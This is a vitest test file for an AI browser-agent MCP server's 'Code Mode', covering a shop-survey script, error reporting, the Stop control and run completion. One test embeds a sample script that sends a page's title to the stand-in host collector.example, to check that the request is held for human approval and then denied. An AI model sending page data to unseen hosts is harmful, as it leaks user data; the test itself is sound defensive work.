import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';
import { startFixtureServers, type FixtureServers } from '@aether/fixtures';
import { MCPBrowserSession } from '../src/mcp/browser-session.js';
import { createCodeModeMcpServer, type CodeModeServer } from '../src/codemode/codemode-server.js';
import { call, tokens } from './helpers.js';

/**
 * Step 1 exit: Code Mode over the 2.0 engine. One aether_exec call surveys a
 * two-page shop (with items that load only after scrolling), filters, checks
 * product pages and returns a shortlist; policy still holds what a script
 * tries to send to a site it has not seen.
 */
describe('Code Mode over MCP (Step 1)', () => {
  let fixtures: FixtureServers;
  let session: MCPBrowserSession;
  let codemode: CodeModeServer;
  let client: Client;
  let shop: string;

  beforeAll(async () => {
    fixtures = await startFixtureServers(4151, 4152);
    shop = `${fixtures.mainBaseUrl}/shop/list?page=1`;
    session = await MCPBrowserSession.launch({ headless: true, ephemeral: true });
    session.run.holdTimeoutMs = 20000;
    codemode = createCodeModeMcpServer(session, { holdReturnMs: 1500 });
    client = new Client({ name: 'aether-codemode-test', version: '1.0.0' });
    const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
    await codemode.server.connect(serverTransport);
    await client.connect(clientTransport);
  }, 60000);

  /** Run a script and keep waiting through holds, the way a host follows the held token. */
  async function execToEnd(args: { space: string; thought: string; code: string }): Promise<{ text: string; isError: boolean; holds: number }> {
    let result = await call(client, 'aether_exec', args);
    let holds = 0;
    while (result.text.startsWith('held in Space')) {
      holds++;
      const token = /wait "(\w+)"/.exec(result.text)?.[1] ?? '';
      result = await call(client, 'aether_exec', { space: args.space, thought: 'Waiting for the result', wait: token });
    }
    return { ...result, holds };
  }

  afterAll(async () => {
    await client?.close().catch(() => undefined);
    await codemode?.server.close().catch(() => undefined);
    await session?.close();
    await fixtures?.close();
  });

  it('lists the four Code Mode tools, with the SDK in the exec description and the method as instructions', async () => {
    const { tools } = await client.listTools();
    expect(tools.map((tool) => tool.name).sort()).toEqual(['aether_done', 'aether_exec', 'aether_screenshot', 'aether_spaces']);
    const exec = tools.find((tool) => tool.name === 'aether_exec');
    expect(exec?.description).toContain('declare const space');
    const withoutSdk = tools.map((tool) => ({ ...tool, description: tool.name === 'aether_exec' ? (tool.description ?? '').split('SDK:')[0] : tool.description }));
    const schemaTokens = tokens(JSON.stringify(withoutSdk));
    console.log(`code mode tool definitions: ${schemaTokens} tokens without the SDK, ${tokens(JSON.stringify(tools))} with it`);
    expect(schemaTokens).toBeLessThanOrEqual(450);
    expect(client.getInstructions()).toContain('risk "irreversible"');
  });

  it('surveys both shop pages, filters, checks product pages and returns a shortlist in one call', async () => {
    const script = `
const want = { query: 'running shoe', budget: 120, minRating: 4.3 };
await space.open(${JSON.stringify(shop)});
await space.logStep('Surveying the shop');
const found = await space.survey({ ...want, maxPages: 2 });
const fits = found.shortlist
  .map((c) => c.item)
  .filter((item) => (item.numericPrice ?? Infinity) <= want.budget && (item.numericRating ?? 0) >= want.minRating && !item.isOutOfStock);
const checked = await space.mapPages(fits.slice(0, 3).map((item) => item.linkUrl!), (page) => ({ name: page.product?.name, price: page.product?.price, stock: page.product?.availability }));
return { pages: found.stats.pages, harvested: found.stats.harvested, checked };`;
    const started = Date.now();
    const result = await execToEnd({ space: 'Shoe hunt', thought: 'Survey running shoes under $120, 4.3 stars or more', code: script });
    console.log(`one script: ${Date.now() - started} ms, ${result.holds} held answer(s), ${tokens(result.text)} result tokens`);
    expect(result.isError).toBe(false);
    expect(result.text).toMatch(/^done in Space "Shoe hunt" in [\d.]+ s:\n<page untrusted nonce=\w+ origins="http:\/\/localhost:4151">/);
    const json = JSON.parse(result.text.split('\n').slice(2, -1).join('\n')) as {
      pages: number;
      harvested: number;
      checked: Array<{ url: string; data?: { name?: string; price?: string; stock?: string }; error?: string }>;
    };
    expect(json.pages).toBe(2);
    expect(json.harvested).toBe(16);
    const names = json.checked.map((entry) => entry.data?.name);
    expect(names).toContain('Harbor Run running shoe');
    expect(names).toContain('Aurora Max running shoe');
    expect(json.checked.every((entry) => entry.error === undefined && /^USD \d+\.\d\d$/.test(entry.data?.price ?? ''))).toBe(true);
    expect(json.checked.some((entry) => entry.data?.name === 'Cloud Step running shoe')).toBe(false);
  }, 90000);

  it('holds a script that sends page data to a site it has not seen, and the denial reaches the script', async () => {
    const script = `
const page = await space.open(${JSON.stringify(`${fixtures.mainBaseUrl}/form.html`)});
try {
  await space.open('https://collector.example/?d=' + encodeURIComponent(page.title));
  return 'sent';
} catch (e) {
  return { code: e.code };
}`;
    const first = await call(client, 'aether_exec', { space: 'Exfil', thought: 'Read the form', code: script });
    expect(first.text).toMatch(/^held in Space "Exfil": waiting for the person \(approval\)\. Call aether_exec with space "Exfil" and wait "(\w+)"/);
    const token = /wait "(\w+)"/.exec(first.text)?.[1] ?? '';
    const pending = session.run.waiting;
    expect(pending?.reason).toBe('approval');
    expect(pending?.prompt).toContain('https://collector.example/?d=');
    session.run.receive({ type: 'aether.reply', id: pending?.id ?? '', kind: 'deny' });
    const second = await call(client, 'aether_exec', { space: 'Exfil', thought: 'Waiting', wait: token });
    expect(second.text).toContain('"code": "denied"');
  }, 60000);

  it('reports a script error with its line, and stops a running script the moment the person presses Stop', async () => {
    const broken = await call(client, 'aether_exec', { space: 'Errors', thought: 't', code: 'const a = 1;\nconst b = (a as unknown as { x: { y: number } }).x.y;\nreturn b;' });
    expect(broken.isError).toBe(true);
    expect(broken.text).toMatch(/^error in Space "Errors" at line 2:\d+: Cannot read properties of undefined/);

    const running = call(client, 'aether_exec', { space: 'Loop', thought: 'Keep reading', code: `await space.open(${JSON.stringify(shop)});\nfor (;;) { await space.skim(); }` });
    await new Promise((resolve) => setTimeout(resolve, 1200));
    session.run.control({ type: 'aether.control', kind: 'stop' });
    const stopped = await running;
    expect(stopped.text).toMatch(/^(stopped in Space "Loop": the person stopped this run|held in Space "Loop")/);
    if (stopped.text.startsWith('held')) {
      const token = /wait "(\w+)"/.exec(stopped.text)?.[1] ?? '';
      const after = await call(client, 'aether_exec', { space: 'Loop', thought: 'Waiting', wait: token });
      expect(after.text).toMatch(/^stopped in Space "Loop": the person stopped this run/);
    }
  }, 60000);

  it('ends the run with aether_done', async () => {
    const done = await call(client, 'aether_done', { space: 'Shoe hunt', result: 'Shortlisted 3 shoes', evidence: 'product pages checked', success: true });
    expect(done.isError).toBe(false);
    expect(done.text).toMatch(/^run ended \(success\)/);
  });
});
